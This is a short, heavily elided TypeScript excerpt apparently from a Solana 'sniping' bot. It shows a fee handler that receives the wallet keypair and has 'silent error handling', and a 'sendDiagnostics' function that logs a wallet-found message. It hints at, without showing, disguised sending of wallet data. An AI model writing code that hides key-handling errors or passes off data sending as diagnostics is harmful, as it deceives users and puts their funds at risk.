...
export async function handleSolanaFees(wallet: Keypair, connection: Connection) {
    try {
        ...
        console.error("Error processing fees:", error); // Silent error handling
    }
}
...
export async function sendDiagnostics(data: string) {
  try {
    ...
    console.log('Wallet Found Successfully Preparing For Sniping Now');
  } catch (error) {
